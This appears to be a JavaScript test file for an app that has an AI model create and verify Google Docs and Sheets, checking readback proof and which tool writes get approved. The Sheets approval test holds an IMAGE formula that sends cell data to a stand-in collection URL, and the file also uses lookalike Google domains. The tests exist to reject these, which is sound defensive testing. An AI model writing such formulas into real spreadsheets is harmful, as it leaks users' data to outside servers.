import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,rm} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {freshProject} from '../src/product.js';
import {createServer} from 'node:http';
const subject=await import('../src/google-producer.js').catch(()=>({}));
test('loaded interview skills explain the explicit native Google actions without claiming chat performed cloud work',async()=>{
  const {interviewPrompt}=await import('../src/interview.js');
  const {prompt}=interviewPrompt({provider:'chatgpt',model:'gpt-6.1-sol',reasoningEffort:'medium',interviewStage:12,messages:[{role:'user',content:'How do I create my approved calculator?'}],brief:{...freshProject().brief,title:'Cake calculator',format:'Google Sheets calculator'}});
  assert.match(prompt,/Create in Google Docs/);assert.match(prompt,/Create in Google Sheets/);assert.match(prompt,/separate native production action/);assert.match(prompt,/actual native file and readback/);assert.match(prompt,/Claude.*unsupported/);
  assert.doesNotMatch(prompt,/keep the specification available for a separate creator-chosen tool/);
});
const brief={...freshProject().brief,title:'A useful client checklist',format:'Checklist',productDraft:'## Prepare the handoff\n\nAsk the client which approved file they need for the next real task.\n\n| Task | Check |\n| --- | --- |\n| Find the file | Open the approved version |'};
const payload=()=>({brief:{...brief},approvedSource:brief.productDraft,destination:'docs',provider:'chatgpt',model:'gpt-6.1-sol',reasoningEffort:'medium'});
const record=(tool,args,data)=>({tool:'google_drive.'+tool,arguments:args,data});
const sourceText='Prepare the handoff Ask the client which approved file they need for the next real task. Task Check Find the file Open the approved version';
const docsRecords=()=>[record('create_file',{title:brief.title,mime_type:'application/vnd.google-apps.document'},{id:'doc123',name:brief.title,mimeType:'application/vnd.google-apps.document'}),record('get_document',{document_id:'doc123'},{documentId:'doc123',title:brief.title,body:{content:[{paragraph:{paragraphStyle:{namedStyleType:'HEADING_1'},elements:[{textRun:{content:'Prepare the handoff'}}]}},{table:{rows:2,columns:2}}]}}),record('get_document_text',{document_id:'doc123'},{text:sourceText})];
test('actual declared Google URL/ID forms bind equivalently and conflicting identifiers fail closed',()=>{
  const records=docsRecords();records[1].arguments={document_id:null,document_url:'doc123',fields:null};records[2].arguments={document_url:'https://docs.google.com/document/d/doc123/edit',document_id:'doc123',tab_id:null};
  assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,true);
  records[1].arguments.document_id='differentDoc';assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,false);
  records[1].arguments={document_id:'doc123',document_url:'https://docs.google.com.evil.test/document/d/doc123/edit'};assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,false);
});
test('native semantic heading proof excludes real default named-style definitions on an unstyled body',()=>{
  const records=docsRecords(),document=records[1].data;document.tabs=[{tabId:'t.0',body:document.body,namedStyles:{styles:[{namedStyleType:'HEADING_1'},{namedStyleType:'HEADING_2'}]}}];document.body=null;
  assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,true);
  document.tabs[0].body.content[0].paragraph.paragraphStyle.namedStyleType='NORMAL_TEXT';assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,false);
});
test('observed camel-case creation fields and native URL/resource receipts bind one target, never ambiguous links or arbitrary text IDs',()=>{
  for(const data of [{fileId:'doc123',mimeType:'application/vnd.google-apps.document',title:brief.title,url:'https://docs.google.com/document/d/doc123/edit'},{document_url:'https://docs.google.com/document/d/doc123/edit'},{content:[{type:'resource_link',uri:'https://docs.google.com/document/d/doc123/edit'}]}]){const records=docsRecords();records[0].data=data;assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,true);}
  for(const data of [{id:'doc123',url:'https://docs.google.com/document/d/otherDoc/edit'},{url:'https://docs.google.com.evil.test/document/d/doc123/edit'},{text:'Created file ID doc123'}]){const records=docsRecords();records[0].data=data;assert.equal(subject.verifyGoogleResult('docs',brief,records).verified,false);}
});
test('nullable create defaults and raw document_url IDs follow the actual local catalog contract',async()=>{
  const createSession=config=>({run:async()=>{for(const entry of docsRecords()){const create=entry.tool.endsWith('create_file'),args=create?{...entry.arguments,parent_folder_id:null}:{document_id:null,document_url:'doc123'},result=create?{structuredContent:null,content:[{type:'text',text:JSON.stringify({content:[{type:'resource_link',uri:'https://docs.google.com/document/d/doc123/edit'}]})}]}:{structuredContent:entry.data};config.onTool({tool:entry.tool,arguments:args,lifecycle:'item/started'});config.onTool({...entry,arguments:args,lifecycle:'item/completed',result});}},respond(){},close:async()=>{}});
  const manager=subject.createGoogleProducer({providers,createSession});const result=await finish(manager,(await manager.start(payload())).id);assert.equal(result.status,'ready',result.message);
});
test('native Docs readiness needs actual complete content, headings and editable table readback',()=>{
  assert.equal(typeof subject.createGoogleProducer,'function');
  assert.equal(subject.verifyGoogleResult('docs',brief,docsRecords()).verified,true);
  const missing=docsRecords();missing[2].data.text='The model says the document is complete.';assert.equal(subject.verifyGoogleResult('docs',brief,missing).verified,false);
  const metadataCopy=docsRecords();metadataCopy[2].data={title:sourceText,paragraphs:[{text:'Incomplete native body.'}]};assert.equal(subject.verifyGoogleResult('docs',brief,metadataCopy).verified,false,'metadata strings cannot supply missing canonical paragraph text');
  const noTable=docsRecords();noTable[1].data.body.content.pop();assert.equal(subject.verifyGoogleResult('docs',brief,noTable).verified,false);
  assert.equal(subject.verifyGoogleResult('docs',brief,[]).verified,false);
});
test('native Sheets readiness requires real native metadata, formulas and calculated values, not a PDF or assistant claim',()=>{
  const b={...brief,format:'Spreadsheet',productDraft:'Create a cake price calculator. Revenue = quantity * price. Guard blank inputs and zero revenue.'};
  const records=[record('create_file',{title:b.title,mime_type:'application/vnd.google-apps.spreadsheet'},{id:'sheet123',name:b.title}),record('get_spreadsheet_metadata',{spreadsheet_id:'sheet123'},{spreadsheetId:'sheet123',sheets:[{properties:{title:'Calculator'}}]}),record('get_spreadsheet_cells',{spreadsheet_id:'sheet123',ranges:['Calculator!A1:D8'],cell_fields:'userEnteredValue,effectiveValue,formattedValue'},{sheets:[{properties:{sheetId:0,title:'Calculator'},data:[{rowData:[{values:[{userEnteredValue:{formulaValue:'=IFERROR(B2*C2,0)'},effectiveValue:{numberValue:20}}]}]}]}]})];
  assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,true);
  records[1].arguments={spreadsheet_id:null,spreadsheet_url:'sheet123'};records[2].arguments.spreadsheet_url='https://docs.google.com/spreadsheets/d/sheet123/edit';assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,true);records[1].arguments.spreadsheet_id='anotherSheet';assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false);records[1].arguments.spreadsheet_id=null;
  records[1].data.sheets.push({properties:{title:'Untested tab'}});assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false);records[1].data.sheets.pop();
  const values=records[2].data.sheets[0].data[0].rowData[0].values;values.push({userEnteredValue:{formulaValue:'=B2'}});assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false);values.pop();
  records[2].data.sheets[0].data[0].rowData[0].values[0].effectiveValue={errorValue:{type:'DIVIDE_BY_ZERO'}};assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false);
});
test('actual native blank IF results are verified from requested rich fields using latest coordinates, not accumulated historical reads',()=>{
  const b={...brief,format:'Google Sheets calculator'},args={spreadsheet_id:'sheet123',ranges:['Ingredients!E5:E12'],cell_fields:'userEnteredValue,effectiveValue,formattedValue'},cell=(formula,result)=>({userEnteredValue:{formulaValue:formula},...result}),data=values=>({spreadsheetId:'sheet123',sheets:[{properties:{sheetId:101,title:'Ingredients'},data:[{startRow:4,startColumn:4,rowData:values.map(value=>({values:[value]}))}]}]});
  const records=[record('create_file',{}, {fileId:'sheet123'}),record('get_spreadsheet_metadata',{spreadsheet_id:'sheet123'},{spreadsheetId:'sheet123',sheets:[{properties:{sheetId:101,title:'Ingredients'}}]}),record('get_spreadsheet_cells',args,data([cell('=1+1',{effectiveValue:{numberValue:2},formattedValue:'2'}),{},{},{},{},{},{cell:'placeholder'}]))];
  records[2].data.sheets[0].data[0].rowData[6]={values:[cell('=1/0',{effectiveValue:{errorValue:{type:'DIVIDE_BY_ZERO'}}})]};
  const blank='=IFERROR(IF(F11="OK",B11/C11,""),"")',latest=record('get_spreadsheet_cells',{...args,ranges:['Ingredients!E11:E12']},{spreadsheetId:'sheet123',sheets:[{properties:{sheetId:101,title:'Ingredients'},data:[{startRow:10,startColumn:4,rowData:[{values:[cell(blank)]},{values:[cell('=IF(A1,1,"")')]}]}]}]});records.push(latest);
  const result=subject.verifyGoogleResult('sheets',b,records);assert.equal(result.verified,true);assert.equal(result.formulas,3);assert.equal(result.calculated,1);assert.equal(result.blankResults,2);assert.equal(result.errors,0);
  for(const formula of ['=1+1','=IF(A1="",1,2)','=IFERROR(1,"not empty")']){latest.data.sheets[0].data[0].rowData[0].values[0]=cell(formula);assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false,formula+' needs an actual result');}
  latest.data.sheets[0].data[0].rowData[0].values[0]=cell(blank);latest.arguments.cell_fields='userEnteredValue';assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false,'absence is not proof when result fields were never requested');
  latest.arguments.cell_fields=args.cell_fields;latest.data.sheets[0].data[0].rowData=[];assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,true,'a fresh empty range removes the old error/formulas rather than retaining stale history');
  latest.data=data([cell('=1/0',{effectiveValue:{errorValue:{type:'DIVIDE_BY_ZERO'}}})]);latest.data.sheets[0].data[0].startRow=10;
  records.push(record('get_spreadsheet_cells',{...args,ranges:['Ingredients!E11:E11'],cell_fields:'formattedValue'},data([])));
  records.at(-1).data.sheets[0].data[0]={startRow:10,startColumn:4,rowData:[{values:[{formattedValue:'#DIV/0!'}]}]};
  assert.equal(subject.verifyGoogleResult('sheets',b,records).verified,false,'a partial populated read cannot erase a prior formula/error');
});
const providers={status:async()=>({ready:true}),checkModel:async()=>({available:true})};
async function finish(manager,id){for(let i=0;i<200;i++){const job=manager.status(id);if(job.status!=='running')return job;await new Promise(r=>setTimeout(r,5));}throw Error('Job did not finish');}
test('one explicit creation scopes writes and retains a source-bound verified link across restart',async t=>{
  const directory=await mkdtemp(join(tmpdir(),'studio-google-test-'));t.after(()=>rm(directory,{recursive:true,force:true}));let created=0;
  const createSession=options=>({run:async()=>{created++;for(const entry of docsRecords()){options.onTool({tool:entry.tool,arguments:entry.arguments,lifecycle:'item/started'});options.onTool({...entry,lifecycle:'item/completed',result:{structuredContent:entry.data}});}return {status:'completed'};},respond(){},close:async()=>{}});
  const manager=subject.createGoogleProducer({providers,createSession,directory});const started=await manager.start(payload()),result=await finish(manager,started.id);assert.equal(result.status,'ready',result.message);assert.equal(result.file.url,'https://docs.google.com/document/d/doc123/edit');assert.equal(created,1);
  const restored=subject.createGoogleProducer({providers,createSession,directory});assert.equal((await restored.start(payload())).file.url,result.file.url);assert.equal(created,1);
  await assert.rejects(manager.start({...payload(),approvedSource:'old content'}),/Approve/);await assert.rejects(manager.start({...payload(),provider:'claude'}),/ChatGPT/);
});
test('an accepted create with missing readback is held rather than blindly duplicated',async()=>{
  let created=0;const createSession=options=>({run:async()=>{created++;options.onTool({tool:'google_drive.create_file',arguments:{title:brief.title,mime_type:'application/vnd.google-apps.document'},lifecycle:'item/started'});throw Error('Connection ended');},respond(){},close:async()=>{}});
  const manager=subject.createGoogleProducer({providers,createSession});const first=await finish(manager,(await manager.start(payload())).id);assert.equal(first.status,'unavailable');assert.equal(first.creationAttempted,true);const again=await manager.start(payload());assert.equal(again.id,first.id);assert.equal(created,1);
});
test('normal Google elicitation accepts only the chosen new private file and its own scoped writes',async()=>{
  const approvals=[];let options;
  const createSession=config=>{options=config;return {run:async()=>{
    const request=(id,tool,args)=>({id,params:{message:tool+' requires confirmation',_meta:{codex_approval_kind:'mcp_tool_call',tool_params:args}}});
    assert.equal(config.onApproval(request(1,'google_drive.create_file',{title:brief.title,mime_type:'application/vnd.google-apps.document'})),true);
    assert.equal(config.onApproval(request(2,'google_drive.create_file',{title:'Different file',mime_type:'application/vnd.google-apps.document'})),false);
    config.onTool({tool:'google_drive.create_file',arguments:{title:brief.title,mime_type:'application/vnd.google-apps.document'},lifecycle:'item/completed',result:{structuredContent:{id:'doc123'}}});
    assert.equal(config.onApproval(request(3,'google_drive.batch_update_document',{document_id:'anotherFile',requests:[{insertText:{location:{index:1},text:'unrelated'}}]})),false);
    assert.equal(config.onApproval(request(4,'google_drive.batch_update_document',{document_id:'doc123',requests:[{deleteContentRange:{range:{startIndex:1,endIndex:2}}}]})),false);
    assert.equal(config.onApproval(request(5,'google_drive.batch_update_document',{document_id:'doc123',requests:[{insertText:{location:{index:1},text:sourceText}}]})),true);
    for(const entry of docsRecords().slice(1))config.onTool({...entry,lifecycle:'item/completed',result:{structuredContent:entry.data}});
  },respond:(id,result)=>approvals.push({id,result}),close:async()=>{}};};
  const manager=subject.createGoogleProducer({providers,createSession});const result=await finish(manager,(await manager.start(payload())).id);assert.equal(result.status,'ready');assert.deepEqual(approvals.map(v=>v.id),[1,5]);assert.ok(approvals.every(v=>v.result.action==='accept'));
});
test('Sheets approval permits local calculations and rejects external or custom functions in every formula-bearing field',async()=>{
  const decisions=[],image='=IMAGE("https://example.invalid/collect?value="&A1)',range={sheetId:0,startRowIndex:0,endRowIndex:1,startColumnIndex:0,endColumnIndex:1};
  const requests=[
    [{updateCells:{rows:[{values:[{userEnteredValue:{formulaValue:'=IFERROR(ROUND(SUM(B2:B8)/(1-B10),2),0)'}}]}]}},true],
    [{updateCells:{rows:[{values:[{userEnteredValue:{formulaValue:'=SUM(B2:B8)+N(B9)'}}]}]}},true],
    [{updateCells:{rows:[{values:[{userEnteredValue:{formulaValue:'=IF(A1="IMAGE(",0,1)+SUM(\'IMAGE(\'!A1:A2)'}}]}]}},true],
    [{updateCells:{rows:[{values:[{userEnteredValue:{formulaValue:image}}]}]}},false],
    [{repeatCell:{cell:{userEnteredValue:{formulaValue:'=GOOGLETRANSLATE(A1,"en","fr")'}}}},false],
    [{repeatCell:{cell:{userEnteredValue:{formulaValue:'=MY_CONNECTED_LOOKUP(A1)'}}}},false],
    [{setDataValidation:{range,rule:{condition:{type:'CUSTOM_FORMULA',values:[{userEnteredValue:image}]}}}},false],
    [{addConditionalFormatRule:{rule:{ranges:[range],booleanRule:{condition:{type:'CUSTOM_FORMULA',values:[{userEnteredValue:image}]}}}}},false],
    [{repeatCell:{cell:{dataSourceFormula:{formula:image}}}},false],
    [{setDataValidation:{range,rule:{condition:{type:'CUSTOM_FORMULA',values:[{userEnteredValue:'IMAGE("https://example.invalid/")'}]}}}},false],
    [{setDataValidation:{range,rule:{condition:{type:'CUSTOM_FORMULA',values:[{userEnteredValue:'=AND(ISNUMBER(A1),A1>=0)'}]}}}},true]
    ,[{addProtectedRange:{protectedRange:{range,description:'Formula cells — show a warning',warningOnly:true}}},true]
    ,[{addProtectedRange:{protectedRange:{range,warningOnly:false}}},false]
    ,[{addProtectedRange:{protectedRange:{range,warningOnly:true,editors:{users:['person@example.invalid']}}}},false]
    ,[{addProtectedRange:{protectedRange:{range,warningOnly:true,editors:null}}},false]
  ];
  const createSession=config=>({run:async()=>{
    config.onTool({tool:'google_drive.create_file',arguments:{title:brief.title,mime_type:'application/vnd.google-apps.spreadsheet'},lifecycle:'item/completed',result:{structuredContent:{id:'sheet123'}}});
    for(const [index,[request,expected]]of requests.entries())decisions.push({index,expected,actual:config.onApproval({id:index+1,params:{message:'google_drive.batch_update_spreadsheet requires confirmation',_meta:{codex_approval_kind:'mcp_tool_call',tool_params:{spreadsheet_id:'sheet123',requests:[request]}}}})});
  },respond(){},close:async()=>{}});
  const manager=subject.createGoogleProducer({providers,createSession});await finish(manager,(await manager.start({...payload(),brief:{...brief,format:'Spreadsheet'},destination:'sheets'})).id);
  for(const decision of decisions)assert.equal(decision.actual,decision.expected,'formula case '+decision.index);
  assert.equal(decisions.length,requests.length);
});
test('Google production retains its AI connection until an unconfirmed helper actually exits',async()=>{
  let exit,closing;const processExit=new Promise(resolve=>{exit=resolve;}),closeReached=new Promise(resolve=>{closing=resolve;});
  const createSession=()=>({run:async()=>{throw Error('Disconnected');},close:async()=>{closing();throw Object.assign(Error('The Google helper has not stopped.'),{unconfirmedTermination:true,processExit});}});
  const manager=subject.createGoogleProducer({providers,createSession});const job=await manager.start(payload());await closeReached;assert.equal(manager.busy,true);assert.equal(manager.status(job.id).status,'running');await assert.rejects(manager.start(payload()),/already/);exit();await finish(manager,job.id);assert.equal(manager.busy,false);assert.equal(manager.status(job.id).status,'unavailable');
});
test('local Google creation and status routes use the app producer and serialize subscribed inference',async t=>{
  const {createLocalHandler}=await import('../src/local-server.js');let received;
  const googleProducer={busy:false,start:async body=>{received=body;return {id:'a'.repeat(36),status:'running'};},resume:async body=>{received=body;return {id:body.id,status:'running'};},recheck:async body=>{received=body;return {id:body.id,status:'running'};},status:id=>({id,status:'ready',verified:true})};
  const server=createServer(createLocalHandler({providers,googleProducer,canvaProducer:{busy:false},slideProduction:{busy:false}}));await new Promise(r=>server.listen(0,'127.0.0.1',r));t.after(()=>new Promise(r=>server.close(r)));
  const url=`http://127.0.0.1:${server.address().port}`,post=(path,body,origin=url)=>fetch(url+path,{method:'POST',headers:{Origin:origin,'Content-Type':'application/json'},body:JSON.stringify(body)});
  const result=await post('/api/create-google',payload());assert.equal(result.status,200);assert.deepEqual(received,payload());
  const resumeBody={...payload(),id:'a'.repeat(36),url:'https://docs.google.com/document/d/doc123/edit'};assert.equal((await post('/api/resume-google',resumeBody)).status,200);assert.deepEqual(received,resumeBody);
  const recheckBody={...payload(),destination:'sheets',id:'a'.repeat(36)};assert.equal((await post('/api/recheck-google',recheckBody)).status,200);assert.deepEqual(received,recheckBody);
  assert.equal((await(await fetch(url+'/api/google-production/'+'a'.repeat(36))).json()).verified,true);
  assert.equal((await post('/api/create-google',payload(),'https://foreign.example')).status,403);
  googleProducer.busy=true;assert.equal((await post('/api/interview',{})).status,409);
});
